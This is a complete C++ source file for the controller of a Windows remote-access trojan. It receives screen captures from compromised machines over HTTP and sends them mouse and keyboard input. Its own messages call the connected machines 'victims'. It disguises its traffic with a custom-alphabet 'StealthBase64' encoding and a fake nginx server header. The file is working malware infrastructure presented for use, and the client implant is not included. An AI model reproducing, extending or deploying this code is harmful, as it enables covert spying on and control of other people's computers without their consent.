#ifdef _WIN32
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <thread>
#include <mutex>
#include <sstream>
#include <chrono>
#include <queue>
#include <fstream>
#include <algorithm>
#include <iomanip>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <gdiplus.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
using namespace Gdiplus;

// Global variables for the GUI
HWND g_hMainWnd = nullptr;
HBITMAP g_hScreenBitmap = nullptr;
int g_remoteWidth = 0;
int g_remoteHeight = 0;
bool g_isConnected = false;
std::string g_currentSession = "";

// Base64 decoder for client data
class StealthBase64 {
private:
    static const std::string chars;
    
public:
    static std::string decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::string result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return result;
    }
    
    static std::string encode(const std::string& input) {
        std::string result;
        int val = 0, valb = -6;
        for (unsigned char c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }
};

const std::string StealthBase64::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

// Simple decompression
class SimpleCompressor {
public:
    static std::vector<unsigned char> decompressRLE(const std::vector<unsigned char>& compressed) {
        std::vector<unsigned char> data;
        
        for (size_t i = 0; i < compressed.size(); ) {
            if (compressed[i] == 0xFF && i + 2 < compressed.size()) {
                unsigned char count = compressed[i + 1];
                unsigned char value = compressed[i + 2];
                for (unsigned char j = 0; j < count; j++) {
                    data.push_back(value);
                }
                i += 3;
            } else {
                data.push_back(compressed[i]);
                i++;
            }
        }
        return data;
    }
};

// Remote session storage
struct RemoteSession {
    std::string id;
    std::string ip;
    std::chrono::system_clock::time_point last_seen;
    bool active;
    int width, height;
    std::string latest_screen_data;
    std::queue<std::string> pending_inputs;
};

class GuiRemoteDesktopServer {
private:
    int port;
    SOCKET server_socket;
    std::map<std::string, RemoteSession> sessions;
    std::mutex sessions_mutex;
    
    std::string generateSessionId(const std::string& ip) {
        auto now = std::chrono::system_clock::now();
        auto time_point = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
        std::string combined = ip + std::to_string(time_point);
        return StealthBase64::encode(combined).substr(0, 12);
    }
    
    std::string getCurrentTime() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }
    
    std::string extractJsonValue(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":\"";
        size_t pos = json.find(search);
        if (pos != std::string::npos) {
            pos += search.length();
            size_t end = json.find("\"", pos);
            if (end != std::string::npos) {
                return json.substr(pos, end - pos);
            }
        }
        return "";
    }
    
    void sendHttpResponse(SOCKET client_socket, int status_code, const std::string& content_type, const std::string& body) {
        std::stringstream response;
        response << "HTTP/1.1 " << status_code;
        
        switch (status_code) {
            case 200: response << " OK"; break;
            case 404: response << " Not Found"; break;
            case 400: response << " Bad Request"; break;
            default: response << " Unknown";
        }
        
        response << "\r\n";
        response << "Content-Type: " << content_type << "\r\n";
        response << "Content-Length: " << body.length() << "\r\n";
        response << "Connection: close\r\n";
        response << "Server: nginx/1.18.0\r\n";
        response << "Access-Control-Allow-Origin: *\r\n";
        response << "Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n";
        response << "Access-Control-Allow-Headers: Content-Type\r\n";
        response << "Cache-Control: no-cache\r\n";
        response << "\r\n";
        response << body;
        
        std::string resp_str = response.str();
        send(client_socket, resp_str.c_str(), resp_str.length(), 0);
    }
    
    void updateDesktopDisplay(const std::string& session_id, const std::string& screen_data, int width, int height) {
        // Decode the screen data
        std::string decoded = StealthBase64::decode(screen_data);
        std::vector<unsigned char> decompressed = SimpleCompressor::decompressRLE(
            std::vector<unsigned char>(decoded.begin(), decoded.end())
        );
        
        // Create bitmap from decompressed data
        if (decompressed.size() > 0 && width > 0 && height > 0) {
            HDC hdc = GetDC(nullptr);
            HDC hdcMem = CreateCompatibleDC(hdc);
            
            // Create new bitmap
            if (g_hScreenBitmap) {
                DeleteObject(g_hScreenBitmap);
            }
            
            BITMAPINFO bmi = {};
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height; // Top-down
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = BI_RGB;
            
            void* pBits = nullptr;
            g_hScreenBitmap = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &pBits, nullptr, 0);
            
            if (g_hScreenBitmap && pBits) {
                // Copy decompressed data to bitmap
                memcpy(pBits, decompressed.data(), decompressed.size());
                
                g_remoteWidth = width;
                g_remoteHeight = height;
                g_isConnected = true;
                g_currentSession = session_id;
                
                // Trigger window repaint
                if (g_hMainWnd) {
                    InvalidateRect(g_hMainWnd, nullptr, TRUE);
                }
            }
            
            DeleteDC(hdcMem);
            ReleaseDC(nullptr, hdc);
        }
    }
    
    void handleRequest(SOCKET client_socket, const std::string& client_ip) {
        char buffer[65536] = {0}; // Larger buffer for screen data
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        
        if (bytes_received <= 0) {
            closesocket(client_socket);
            return;
        }
        
        std::string request(buffer, bytes_received);
        std::vector<std::string> lines;
        std::stringstream ss(request);
        std::string line;
        while (std::getline(ss, line)) {
            lines.push_back(line);
        }
        
        if (lines.empty()) {
            closesocket(client_socket);
            return;
        }
        
        std::istringstream iss(lines[0]);
        std::string method, path, version;
        iss >> method >> path >> version;
        
        if (path.back() == '\r') path.pop_back();
        
        std::cout << "[" << getCurrentTime() << "] " << method << " " << path << " from " << client_ip << std::endl;
        
        if (path == "/api/connect" && method == "GET") {
            handleConnect(client_socket, client_ip);
        } else if (path.find("/api/stream/") == 0 && method == "POST") {
            std::string session_id = path.substr(12);
            size_t body_start = request.find("\r\n\r\n");
            if (body_start != std::string::npos) {
                body_start += 4;
                std::string body = request.substr(body_start);
                handleScreenData(client_socket, session_id, body);
            }
        } else if (path.find("/api/input/") == 0 && method == "GET") {
            std::string session_id = path.substr(11);
            handleInputRequest(client_socket, session_id);
        } else if (path.find("/api/input/") == 0 && method == "POST") {
            std::string session_id = path.substr(11);
            size_t body_start = request.find("\r\n\r\n");
            if (body_start != std::string::npos) {
                body_start += 4;
                std::string body = request.substr(body_start);
                handleInputSubmit(client_socket, session_id, body);
            }
        } else {
            sendHttpResponse(client_socket, 404, "text/plain", "Not Found");
        }
        
        closesocket(client_socket);
    }
    
    void handleConnect(SOCKET client_socket, const std::string& client_ip) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        std::string session_id = generateSessionId(client_ip);
        RemoteSession session;
        session.id = session_id;
        session.ip = client_ip;
        session.last_seen = std::chrono::system_clock::now();
        session.active = true;
        session.width = 0;
        session.height = 0;
        
        sessions[session_id] = session;
        
        std::cout << "[+] New victim connected: " << session_id << " from " << client_ip << std::endl;
        
        std::string response = "{\"status\":\"connected\",\"session\":\"" + session_id + "\"}";
        sendHttpResponse(client_socket, 200, "application/json", response);
    }
    
    void handleScreenData(SOCKET client_socket, const std::string& session_id, const std::string& data) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        if (sessions.find(session_id) != sessions.end()) {
            sessions[session_id].last_seen = std::chrono::system_clock::now();
            
            std::string width_str = extractJsonValue(data, "width");
            std::string height_str = extractJsonValue(data, "height");
            std::string screen_data = extractJsonValue(data, "data");
            
            if (!width_str.empty() && !height_str.empty() && !screen_data.empty()) {
                int width = std::stoi(width_str);
                int height = std::stoi(height_str);
                
                sessions[session_id].width = width;
                sessions[session_id].height = height;
                sessions[session_id].latest_screen_data = screen_data;
                
                // Update the GUI display
                updateDesktopDisplay(session_id, screen_data, width, height);
                
                std::cout << "[+] Screen update: " << session_id << " (" 
                         << width_str << "x" << height_str << ")" << std::endl;
            }
            
            sendHttpResponse(client_socket, 200, "text/plain", "OK");
        } else {
            sendHttpResponse(client_socket, 404, "text/plain", "Session not found");
        }
    }
    
    void handleInputRequest(SOCKET client_socket, const std::string& session_id) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        if (sessions.find(session_id) != sessions.end()) {
            std::string input_cmd = "";
            if (!sessions[session_id].pending_inputs.empty()) {
                input_cmd = sessions[session_id].pending_inputs.front();
                sessions[session_id].pending_inputs.pop();
            }
            
            std::string response = "{\"input\":\"" + input_cmd + "\"}";
            sendHttpResponse(client_socket, 200, "application/json", response);
        } else {
            sendHttpResponse(client_socket, 404, "text/plain", "Session not found");
        }
    }
    
    void handleInputSubmit(SOCKET client_socket, const std::string& session_id, const std::string& data) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        if (sessions.find(session_id) != sessions.end()) {
            std::string input_data = extractJsonValue(data, "input");
            if (!input_data.empty()) {
                sessions[session_id].pending_inputs.push(input_data);
                std::cout << "[+] Input queued for " << session_id << std::endl;
            }
            sendHttpResponse(client_socket, 200, "text/plain", "OK");
        } else {
            sendHttpResponse(client_socket, 404, "text/plain", "Session not found");
        }
    }

public:
    GuiRemoteDesktopServer(int p) : port(p) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw std::runtime_error("WSAStartup failed");
        }
    }
    
    ~GuiRemoteDesktopServer() {
        WSACleanup();
    }
    
    void queueInput(const std::string& input_data) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        if (!g_currentSession.empty() && sessions.find(g_currentSession) != sessions.end()) {
            std::string encoded = StealthBase64::encode(input_data);
            sessions[g_currentSession].pending_inputs.push(encoded);
        }
    }
    
    void start() {
        server_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (server_socket == INVALID_SOCKET) {
            throw std::runtime_error("Failed to create socket");
        }
        
        int opt = 1;
        setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        
        sockaddr_in address;
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(port);
        
        if (bind(server_socket, (struct sockaddr*)&address, sizeof(address)) < 0) {
            throw std::runtime_error("Bind failed");
        }
        
        if (listen(server_socket, 10) < 0) {
            throw std::runtime_error("Listen failed");
        }
        
        std::cout << "===============================================" << std::endl;
        std::cout << "🖥️  GUI Remote Desktop Server Started" << std::endl;
        std::cout << "===============================================" << std::endl;
        std::cout << "📡 Listening on port: " << port << std::endl;
        std::cout << "🎯 Victims connect to: http://your-ip:" << port << "/api/connect" << std::endl;
        std::cout << "🖥️  Native window will open when victim connects" << std::endl;
        std::cout << "===============================================" << std::endl;
        
        while (true) {
            sockaddr_in client_addr;
            int client_addr_len = sizeof(client_addr);
            
            SOCKET client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_len);
            if (client_socket == INVALID_SOCKET) {
                continue;
            }
            
            std::string client_ip = inet_ntoa(client_addr.sin_addr);
            std::thread(&GuiRemoteDesktopServer::handleRequest, this, client_socket, client_ip).detach();
        }
    }
};

// Global server instance
GuiRemoteDesktopServer* g_pServer = nullptr;

// Windows message handler for the desktop window
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            if (g_hScreenBitmap && g_isConnected) {
                HDC hdcMem = CreateCompatibleDC(hdc);
                HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, g_hScreenBitmap);
                
                RECT clientRect;
                GetClientRect(hwnd, &clientRect);
                
                // Scale the remote desktop to fit the window
                StretchBlt(hdc, 0, 0, clientRect.right, clientRect.bottom,
                          hdcMem, 0, 0, g_remoteWidth, g_remoteHeight, SRCCOPY);
                
                SelectObject(hdcMem, hOldBitmap);
                DeleteDC(hdcMem);
            } else {
                // Show "Waiting for connection..." message
                RECT clientRect;
                GetClientRect(hwnd, &clientRect);
                SetTextColor(hdc, RGB(255, 255, 255));
                SetBkColor(hdc, RGB(40, 40, 40));
                
                std::string message = "Waiting for victim connection...";
                DrawTextA(hdc, message.c_str(), -1, &clientRect, 
                         DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            }
            
            EndPaint(hwnd, &ps);
            return 0;
        }
        
        case WM_LBUTTONDOWN: {
            if (g_isConnected && g_pServer) {
                int x = LOWORD(lParam);
                int y = HIWORD(lParam);
                
                RECT clientRect;
                GetClientRect(hwnd, &clientRect);
                
                // Scale coordinates to match remote screen
                int remoteX = (x * g_remoteWidth) / clientRect.right;
                int remoteY = (y * g_remoteHeight) / clientRect.bottom;
                
                std::string clickData = "click:" + std::to_string(remoteX) + ":" + std::to_string(remoteY);
                g_pServer->queueInput(clickData);
                
                std::cout << "[+] Click sent: " << remoteX << "," << remoteY << std::endl;
            }
            return 0;
        }
        
        case WM_RBUTTONDOWN: {
            if (g_isConnected && g_pServer) {
                int x = LOWORD(lParam);
                int y = HIWORD(lParam);
                
                RECT clientRect;
                GetClientRect(hwnd, &clientRect);
                
                int remoteX = (x * g_remoteWidth) / clientRect.right;
                int remoteY = (y * g_remoteHeight) / clientRect.bottom;
                
                std::string clickData = "rightclick:" + std::to_string(remoteX) + ":" + std::to_string(remoteY);
                g_pServer->queueInput(clickData);
                
                std::cout << "[+] Right-click sent: " << remoteX << "," << remoteY << std::endl;
            }
            return 0;
        }
        
        case WM_KEYDOWN: {
            if (g_isConnected && g_pServer) {
                char key[2] = {0};
                if (wParam >= 32 && wParam <= 126) {
                    key[0] = (char)wParam;
                    std::string keyData = "key:" + std::string(key);
                    g_pServer->queueInput(keyData);
                    std::cout << "[+] Key sent: " << key << std::endl;
                } else if (wParam == VK_RETURN) {
                    g_pServer->queueInput("key:ENTER");
                    std::cout << "[+] Enter sent" << std::endl;
                } else if (wParam == VK_ESCAPE) {
                    g_pServer->queueInput("key:ESCAPE");
                    std::cout << "[+] Escape sent" << std::endl;
                }
            }
            return 0;
        }
        
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

HWND CreateDesktopWindow() {
    const char* className = "RemoteDesktopWindow";
    
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = className;
    wc.hbrBackground = CreateSolidBrush(RGB(40, 40, 40));
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    
    RegisterClassA(&wc);
    
    HWND hwnd = CreateWindowExA(
        0,
        className,
        "Remote Desktop Connection",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 1024, 768,
        nullptr, nullptr, GetModuleHandle(nullptr), nullptr
    );
    
    if (hwnd) {
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
    }
    
    return hwnd;
}

int main(int argc, char* argv[]) {
    int port = 8080;
    if (argc > 1) {
        port = std::stoi(argv[1]);
    }
    
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
    
    try {
        // Create the server
        GuiRemoteDesktopServer server(port);
        g_pServer = &server;
        
        // Create the GUI window
        g_hMainWnd = CreateDesktopWindow();
        if (!g_hMainWnd) {
            std::cerr << "Failed to create window" << std::endl;
            return 1;
        }
        
        // Start server in background thread
        std::thread server_thread([&server]() {
            server.start();
        });
        server_thread.detach();
        
        // Main Windows message loop
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    GdiplusShutdown(gdiplusToken);
    return 0;
}
#else
#include <iostream>
int main() {
    std::cerr << "Remote desktop server is only supported on Windows." << std::endl;
    return 0;
}
#endif // _WIN32
